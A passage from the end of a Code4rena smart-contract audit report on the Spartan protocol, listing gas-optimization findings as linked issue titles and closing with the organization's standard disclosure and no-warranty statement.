calcLiquidityUnitsAsym()](https://github.com/code-423n4/2021-07-spartan-findings/issues/63)\n- [[G-15] Variables that can be  converted into immutable](https://github.com/code-423n4/2021-07-spartan-findings/issues/73)\n- [[G-16] Use unchecked blocks in some cases to save gas.](https://github.com/code-423n4/2021-07-spartan-findings/issues/74)\n- [[G-17] Function purgeDeployer() should be declared external in BondVault.sol](https://github.com/code-423n4/2021-07-spartan-findings/issues/145)\n- [[G-18] Variable one in Utils.sol can be set to constant  ](https://github.com/code-423n4/2021-07-spartan-findings/issues/146)\n- [[G-19] Remove _token from addLiquiditySingleForMember](https://github.com/code-423n4/2021-07-spartan-findings/issues/64)\n- [[G-20] ROUTER.addFee() Gas Optimization](https://github.com/code-423n4/2021-07-spartan-findings/issues/80)\n- [[G-21] POOL.addFee() Gas Optimization](https://github.com/code-423n4/2021-07-spartan-findings/issues/81)\n- [[G-22] SYNTHVAULT.harvestAll() Gas Optimization](https://github.com/code-423n4/2021-07-spartan-findings/issues/82)\n- [[G-23] SYNTHVAULT.addFee() Gas Optimization](https://github.com/code-423n4/2021-07-spartan-findings/issues/83)\n- [[G-24] ROUTER.addTradeFee()](https://github.com/code-423n4/2021-07-spartan-findings/issues/86)\n- [[G-25] ROUTER._handleTransferIn()](https://github.com/code-423n4/2021-07-spartan-findings/issues/87)\n\n# Disclosures\n\nC4 is an open organization governed by participants in the community.\n\nC4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\n\nC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\n"
}